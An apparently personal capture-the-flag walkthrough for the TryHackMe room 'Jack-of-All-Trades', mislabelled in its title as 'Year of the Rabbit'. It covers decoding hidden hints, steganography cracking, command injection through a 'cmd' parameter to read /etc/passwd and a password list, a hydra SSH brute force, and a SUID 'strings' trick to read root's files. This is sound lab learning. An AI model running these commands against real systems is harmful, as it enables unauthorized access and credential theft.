---
title: Walkthrough - Year of the Rabbit
published: false
---

Securit-Tay, Conference, Challenge, Boot-to-Root. Boot-to-root originally designed for Securi-Tay 2020.

[https://tryhackme.com/room/jackofalltrades](https://tryhackme.com/room/jackofalltrades)

* * *

## Notes

> Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems... We must stop him! Can you see through his facade of a forgetful old toymaker and bring this lunatic down?

- nmap give us two ports an ssh and a http server that are swapped around. 

```
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_http-title: Jack-of-all-trades!
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Linux 3.12 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- in order to view the site on port 22 in firefox we have to add this string to about:config ``network.security.ports.banned.override``.

- viewing the source code we find a page ``/recovery.php`` and a base64 encoded text, ``UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==``

```
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

- lets save this to a list for later ``echo "u?WtKSraq" > passwords.list``

- we also find another comment on recovery.php 

```
<!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
```

- decode from base32

```
45727a727a6f72652067756e67206775722070657271726167766e79662067622067757220657270626972656c207962747661206e657220757671717261206261206775722075627a72636e7472212056207861626a2075626a20736265747267736879206c6268206e65722c20666220757265722766206e20757661673a206f76672e796c2f3247694c443246
```

- and decode from ascii

```
Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva ner uvqqra ba gur ubzrcntr! V xabj ubj sbetrgshy lbh ner, fb urer'f n uvag: ovg.yl/2GiLD2F
```

- and finally ROT-13

```
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

- which is a hint to use steganography to find the creds for the recovery.php page
- a few images on the homepage one of which is stego.jpg. lets check them out.
- we can use passwords.list to get the cred.txt from stego

```
Hehe. Gotcha!

You're on the right path, but wrong image!
```

- header.jpg

```
stegseek header.jpg passwords.list 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "u?WtKSraq"
[i] Original filename: "cms.creds".
[i] Extracting to "header.jpg.out".

┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/Jack-of-All-Trades]
└─$ cat header.jpg.out        
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```

now we get to a page where we can possibly lfi using the paramater ``cmd``

- ``http://10.10.86.12:22/nnxhweOV/index.php?cmd=id``
- ``http://10.10.86.12:22/nnxhweOV/index.php?cmd=ls%20/home`` - ``jack jacks_password_list jacks_password_list``
- ``view-source:http://10.10.86.12:22/nnxhweOV/index.php?cmd=cat%20/home/jacks_password_list`` and save to the password.list
- ``http://10.10.86.12:22/nnxhweOV/index.php?cmd=cat /etc/passwd``

- ``hydra -l jack -P passwords.list 10.10.86.12 -s 80 ssh``

- ``[80][ssh] host: 10.10.86.12   login: jack   password: ITMJpGGIqg1jn?>@``

* * * 

## What is the user flag?

![0xskar](/assets/jack-of-all-trades05.png)

- ``scp -P 80 jack@10.10.86.12:/home/jack/user.jpg .``

* * * 

## What is the root flag?

- ``find / -perm -u=s -type f 2>/dev/null`` - ``/usr/bin/strings`` has suid set so we can read any file on the system.

- ``strings /root/root.txt``

* * * 

